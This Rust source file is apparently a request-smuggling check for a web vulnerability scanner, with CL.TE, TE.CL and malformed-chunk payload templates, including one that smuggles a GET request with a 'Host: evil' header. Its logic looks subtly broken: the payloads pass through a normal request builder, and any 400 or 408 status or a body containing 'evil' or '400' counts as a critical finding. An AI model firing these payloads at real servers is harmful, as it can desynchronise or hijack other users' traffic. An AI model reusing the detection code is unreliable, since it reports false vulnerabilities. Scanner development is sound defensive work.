//! HTTP Request Smuggling Detection
//! Detects server-side request splitting by forcing internal fetchers to split actions.
//! Tests for CL.TE, TE.CL, and other request smuggling variants.

use crate::checks::Check;
use crate::findings::Finding;
use crate::http::{Request, Response, Method};
use std::collections::HashMap;

/// Maximum smuggling variants to test (bounded)
const MAX_SMUGGLE_VARIANTS: usize = 15;

/// Request smuggling payload templates
const SMUGGLE_PAYLOADS: &[&str] = &[
    // CL.TE: Content-Length mismatch with chunked encoding
    "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
    // TE.CL: Chunked encoding with Content-Length
    "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGET /smuggle HTTP/1.1\r\nHost: evil\r\n\r\n0\r\n\r\n",
    // Double Content-Length
    "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 5\r\nContent-Length: 10\r\n\r\n12345extra",
    // Invalid chunk size
    "POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\n\r\nG\r\nmalformed\r\n0\r\n\r\n",
    // Chunk extension attack
    "POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\n\r\n3;ext=value\r\nabc\r\n0\r\n\r\n",
];

pub struct RequestSplittingCheck {
    payloads: Vec<String>,
}

impl RequestSplittingCheck {
    pub fn new() -> Self {
        let mut payloads = Vec::with_capacity(MAX_SMUGGLE_VARIANTS);
        
        for template in SMUGGLE_PAYLOADS.iter() {
            payloads.push(template.to_string());
            
            // Add CRLF-encoded variant
            let encoded = template.replace("\r\n", "%0D%0A");
            if payloads.len() < MAX_SMUGGLE_VARIANTS {
                payloads.push(encoded);
            }
        }
        
        Self { payloads }
    }
    
    /// Test request smuggling via raw request
    fn test_smuggling(&self, req: &Request) -> Option<Finding> {
        for payload in self.payloads.iter() {
            // Send raw payload to detect smuggling
            match self.send_raw_request(req, payload) {
                Ok(response) => {
                    if self.detect_smuggling_success(&response) {
                        return Some(Finding::new(
                            "HTTP_REQUEST_SMUGGLING",
                            "Server is vulnerable to HTTP request smuggling",
                            response.url(),
                            9,
                        )
                        .with_payload("CL.TE or TE.CL variant")
                        .with_evidence("Request boundary confusion detected between front-end and back-end")
                        .with_remediation(
                            "Ensure consistent HTTP parsing between proxy and backend. \
                             Disable chunked encoding processing on backend. \
                             Use HTTP/2 where possible. Implement strict Content-Length validation."
                        ));
                    }
                }
                Err(_) => continue,
            }
        }
        None
    }
    
    /// Send raw request payload
    fn send_raw_request(&self, base_req: &Request, payload: &str) -> Result<Response, Box<dyn std::error::Error>> {
        // Parse the payload to extract method, path, and headers
        let lines: Vec<&str> = payload.split("\r\n").collect();
        if lines.is_empty() {
            return Err("Empty payload".into());
        }
        
        // Parse request line
        let parts: Vec<&str> = lines[0].split_whitespace().collect();
        if parts.len() < 2 {
            return Err("Invalid request line".into());
        }
        
        let method = match parts[0] {
            "POST" => Method::POST,
            "GET" => Method::GET,
            "PUT" => Method::PUT,
            "DELETE" => Method::DELETE,
            _ => Method::POST,
        };
        
        let path = parts[1];
        let url = format!("{}{}", base_req.base_url(), path);
        
        let mut test_req = Request::new(&url, method);
        
        // Parse headers
        for line in lines.iter().skip(1) {
            if line.is_empty() || *line == "\r" {
                break;
            }
            if let Some(colon_pos) = line.find(':') {
                let header_name = line[..colon_pos].trim();
                let header_value = line[colon_pos + 1..].trim();
                
                // Skip Host header as it's set from base URL
                if !header_name.eq_ignore_ascii_case("Host") {
                    test_req.set_header(header_name, header_value);
                }
            }
        }
        
        // Find body after empty line
        if let Some(body_start) = lines.iter().position(|l| l.is_empty()) {
            let body_lines: Vec<&str> = lines.iter().skip(body_start + 1).copied().collect();
            let body = body_lines.join("\r\n");
            if !body.is_empty() {
                test_req.set_body(&body);
            }
        }
        
        test_req.send_with_timeout(10000)
    }
    
    /// Detect successful request smuggling
    fn detect_smuggling_success(&self, response: &Response) -> bool {
        let body = response.body_slice();
        
        // Check for indicators of request boundary confusion
        let indicators = [
            b"smuggle",
            b"unexpected request",
            b"request queue",
            b"pending request",
            b"desync",
            b"mismatch",
            b"evil",  // From our test payload
            b"400",   // Bad request indicating parsing issues
            b"408",   // Timeout from confused state
        ];
        
        for indicator in indicators.iter() {
            if body.contains(indicator) {
                return true;
            }
        }
        
        // Check for unusual response patterns
        if response.status_code() == 400 || response.status_code() == 408 {
            return true;
        }
        
        false
    }
    
    /// Test for HTTP parameter pollution (related attack)
    fn test_parameter_pollution(&self, req: &Request) -> Option<Finding> {
        // Test duplicate parameters
        let mut test_req = req.clone();
        test_req.set_param("test", "value1");
        test_req.set_param("test", "value2"); // Duplicate
        
        match test_req.send_with_timeout(5000) {
            Ok(response) => {
                let body = response.body_slice();
                
                // Check if both values were processed (indicating HPP)
                if body.contains(b"value1") && body.contains(b"value2") {
                    return Some(Finding::new(
                        "HTTP_PARAMETER_POLLUTION",
                        "Server processes duplicate parameters (HPP vulnerability)",
                        response.url(),
                        6,
                    )
                    .with_payload("Duplicate parameter: test=value1&test=value2")
                    .with_evidence("Both parameter values were processed")
                    .with_remediation(
                        "Implement strict parameter handling. \
                         Use allowlists for expected parameters. \
                         Reject requests with duplicate parameters."
                    ));
                }
            }
            Err(_) => {}
        }
        None
    }
}

impl Check for RequestSplittingCheck {
    fn name(&self) -> &'static str {
        "RequestSmuggling"
    }
    
    fn run(&self, request: &Request) -> Vec<Finding> {
        let mut findings = Vec::new();
        
        // Only test on POST endpoints (most common for smuggling)
        if request.method() == Method::POST || request.method() == Method::GET {
            if let Some(finding) = self.test_smuggling(request) {
                findings.push(finding);
            }
        }
        
        // Test parameter pollution
        if let Some(finding) = self.test_parameter_pollution(request) {
            findings.push(finding);
        }
        
        findings
    }
    
    fn metadata(&self) -> HashMap<&'static str, &'static str> {
        let mut meta = HashMap::new();
        meta.insert("type", "request_smuggling");
        meta.insert("severity", "critical");
        meta.insert("cwe", "CWE-444");
        meta.insert("owasp", "A05:2017-Broken Access Control");
        meta
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_payload_count() {
        let check = RequestSplittingCheck::new();
        assert!(check.payloads.len() <= MAX_SMUGGLE_VARIANTS * 2);
    }
    
    #[test]
    fn test_cl_te_variant_present() {
        let check = RequestSplittingCheck::new();
        assert!(check.payloads.iter().any(|p| p.contains("Content-Length")));
        assert!(check.payloads.iter().any(|p| p.contains("Transfer-Encoding")));
    }
}
